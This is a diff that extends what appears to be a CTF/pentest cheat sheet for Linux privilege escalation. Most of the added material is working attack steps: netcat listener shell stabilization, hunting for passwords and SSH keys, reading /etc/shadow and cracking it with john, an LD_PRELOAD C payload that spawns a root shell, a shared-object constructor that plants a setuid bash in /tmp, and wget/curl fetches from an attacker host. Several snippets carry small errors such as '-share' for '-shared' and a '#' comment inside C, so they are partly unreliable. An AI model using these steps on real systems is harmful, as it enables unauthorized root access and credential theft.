@@ -241,14 +241,167 @@ Reverse shell:
 Credits:
 [Ansible Playbook Privilege Escalation](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/ansible-playbook-privilege-escalation/)
 
+## Stabilize shell:
+```
+python -c "import pty;pty.spawn('/bin/bash')"
+```
+
+```
+ctrl+z
+```
+
+```
+ftty
+```
+
+or use rlwrap:
+```
+rlwrap nc -vnlp $lport
+```
+
 ### Basic
+
+#### hostname
+```
+hostname
+```
+PS: These could be related to the exploit (CTF perperctive)
+
+#### kernel information
+```
+uname -a
+```
+
+```
+cat /proc/version
+```
+
+```
+lscpu
+```
+
+#### Linux Distribution
+```
+cat /etc/issue
+```
+
+#### Services
+```
+ps aux
+```
+
+#### User enumeration
+
+Who we are?
+```
+whoami
+```
+
+User id:
+```
+id
+```
+
+What we can run as a sudo user?
+```
+sudo -l
+```
+
+Users in the machine:
+```
+cat /etc/passwd
+```
+
+Narrow users that can use bash
+```
+cat /etc/passwd | grep -i bash
+```
+
+#### Network
+
+Check your network interface
+```
+ifconfig
+```
+
+or
+```
+ip a
+```
+
+Arp tables
+```
+arp -a
+```
+
+Routes?
+```
+ip route
+```
+
+Neighbors?
+```
+ip neigh
+```
+
+Ports open and connections that exists:
+```
+netstat -ano | grep -i listen
+```
+PS: Checks for local services (maybe need to use tunneling)
+
 
 ### Automated
 Using linPEAS
 
+```
+./linPEAS.sh
+```
+
 ### Exposed Confidential Information
 
+Check for recursively from / and try to find some file that has password inside
+```
+grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2>/dev/null
+```
+
+Locate files with password in name
+```
+locate password | more
+```
+
+Search for some RSA keys
+```
+find / -name id_rsa 2>/dev/null
+```
+
+
 ### Insecure File Permissions
+
+Check if you can access /etc/shadow, /etc/sudoers, /etc/groups, ...
+```
+cat /etc/shadow
+```
+
+Copy /etc/passwd and /etc/shadow to files with hashes and use unshadow:
+```
+unshadow passwd shadow > unshadow
+```
+
+Then, use john to crack it
+```
+john unshadow --wordlist=/usr/share/wordlist/rockyou.txt
+```
+
+Check your history, maybe you can find some nice commands
+```
+history
+```
+
+or in user home directory
+```
+cat .bash_history
+```
 
 #### CronJobs
 
@@ -256,12 +409,54 @@ Using linPEAS
 cat /etc/crontab
 ```
 
-Add pspy!
+##### Check for some cronjobs out of crontab
+```
+./pspy64
+```
+
 #### Password Authentication
 
 ### Insecure System Components
 
+#### sudo -l
+
+##### LD_PRELOAD
+check if there is a env_keep+=LD_PRELOAD, then we can execute our own library with sudo.
+
+shell.c
+```c
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init(){
+  unsetenv("LD_PRELOAD");
+  # this indicates root user!
+  setgid(0);
+  setuid(0);
+  system("/bin/bash");
+}
+
+```
+Save this file or upload it to machine
+
+Compiling:
+```
+gcc -fPIC -share -o shell.so shell.c -nostartfiles
+```
+
+Run the command:
+```
+sudo LD_PRELOAD=/full/path/to/shell.so (something that we can run as sudo!)
+```
+
 #### Setuid Binaries and Capabilities
+
+```
+find / -perm -u=s -type f 2>/dev/null
+```
+
+Check in [GTFOBins](https://gtfobins.github.io)
 
 ##### cp
 ```
@@ -271,6 +466,8 @@ New password:
 ```
 openssl passwd <Enter your password>
 ```
+
+Get this output and use
 
 Add the new user to passwd.orig
 ```
@@ -282,12 +479,57 @@ Copy your new passwd file:
 cp passwd.orig /etc/passwd
 ```
 
-Su root2!
+Now you got root2 access!
 ```
 su root2
 ```
+##### SO Injection
+
+Try to run the program with strace (local):
+```
+strace /that/program 2>&1 | grep -i  -E "open|access|no such file"
+```
+Then, try to find files that you can overwrite.
+
+your file in c, for example, library.c:
+```c
+# include <stdio.h>
+# include <stdlib.h>
+
+static void inject() __attribute__((constructor));
+
+void inject(){
+  system("cp /bin/bash /tmp/bashroot; chmod +s /tmp/bashroot");
+}
+```
+
+Compile it:
+```
+gcc -fPIC -share -o /path/to/library/library.so library.c
+```
+
+Run that suid file and then go to /tmp and access with:
+```
+./bashroot -p
+```
+
+##### Binary Symlinks nginx
+
+Discovery it manually is kind of hard
+
+Needs sudo in suid binaries
+
+
+##### Environment Variables
+
+Let's exploit $PATH!
+Check if the program uses a binary that is not been executed via full path.
+Then, let's change the PATH
+
 
 #### Kernel Exploits
+
+[lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
 
 ##### Dirty Pipe
 
@@ -331,7 +573,7 @@ copy file.ext \\$lhost\sharename\file.ext
 
 
 ## Linux
-S
+
 ```
 wget http://$lhost:$lport/file.ext
 curl http://$lhost:$lport/file.ext -o /path/to/file.ext
